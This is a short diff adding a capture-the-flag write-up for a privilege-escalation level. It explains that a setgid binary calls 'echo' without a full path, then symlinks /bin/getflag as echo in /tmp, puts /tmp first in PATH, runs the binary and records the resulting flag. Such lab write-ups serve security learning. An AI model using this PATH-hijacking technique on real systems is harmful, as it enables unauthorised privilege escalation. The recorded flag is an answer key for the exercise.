@@ -1,0 +1,12 @@
+# We found that the file 'level03' in the home directory have flag 's' on the group flag03
+# Create a symbolinc link of echo to getflag in /tmp folder where we can write in
+
+ln -s /bin/getflag echo
+
+# To find in first the command echo just add the path of /tmp in PATH variable
+
+export PATH=/tmp:$PATH
+
+# Execute ~/level03, it will print the flag
+
+qi0maab88jeaj46qoumi7maus
